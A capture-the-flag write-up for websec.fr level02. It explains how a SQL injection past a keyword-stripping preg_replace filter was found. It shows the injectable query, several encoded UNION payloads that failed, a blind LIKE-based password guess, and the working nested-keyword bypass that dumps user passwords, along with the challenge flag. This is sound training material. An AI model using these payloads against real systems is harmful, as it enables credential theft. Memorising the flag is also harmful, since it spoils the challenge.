# level02 - 2 points
[Link to the challenge](http://websec.fr/level02)

## Description
```
Nothing fancy, with a twist
```
This application is the same as the previous one (You can check by yourself if you don't trust us). However, the developers saw the logs and found that the application was being attacked so they filtered out some of the database keywords which made it possible.
The following keywords were found to be filtered by the application using preg_replace (): union, order, select, from, group, by.

## Write-up
From the level01 challenge we know that there's a injection vector in:
``` SQL
$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
```
`$injection` comes from the `user_id` parameter (`$_POST['user_id']`). 

The challenge was pretty similar to Level 01, however, now there's was filter:
``` PHP
$searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
$injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
```

I wasted a lot of time ignoring the obvious problem, so I tried encoding the payload `1 UNION SELECT id, password FROM users;--`:
``` PHP
base64_decode('MSBVTklPTiBTRUxFQ1QgbnVsbCwgc3FsIEZST00gc3FsaXRlX21hc3RlciBXSEVSRSB0eXBlPSd0YWJsZSc7IC0t'); // didn't work
urldecode('1%20UNION%20SELECT%20null%2C%20sql%20FROM%20sqlite_master%20WHERE%20type%3D\"table\"%3B%20--'); // didn't work
hex2bin("3120554e494f4e2053454c4543542069642c2070617373776f72642046524f4d2075736572732057484552452069643d313b202d2d"); // didn't work
```

Then, I tried using Burp to "guess" the password character by character sending POSTs with `user_id=1 AND password LIKE "WEBSEC{%"--&submit=Submit+Query`. I got to "WEBSEC{Beca" and gave up.

So i stopped for a second and thought "hm this filter looks pretty unsafe..." so I tested it with  this:
``` PHP
<?php
    $injection = "1 UUNIONNION SSELECTELECT id, password FFROMROM users;--";
    $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
    $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
    
    echo "AFTER REPLACING: " . $injection;
?>
```
Output: `AFTER REPLACING: 1 UNION SELECT id, password FROM users;--`

And done! The filter obviously was pretty weak... So I sent the following payload as the "user_id": `1 UUNIONNION SSELECTELECT id, password FFROMROM users;--`

And the program gave us as the flag:
```
Username for given ID: WEBSEC{BecauseBlacklistsAreOftenAgoodIdea} 

Other User Details:
id -> 1
username -> WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```

**Flag: `WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`**


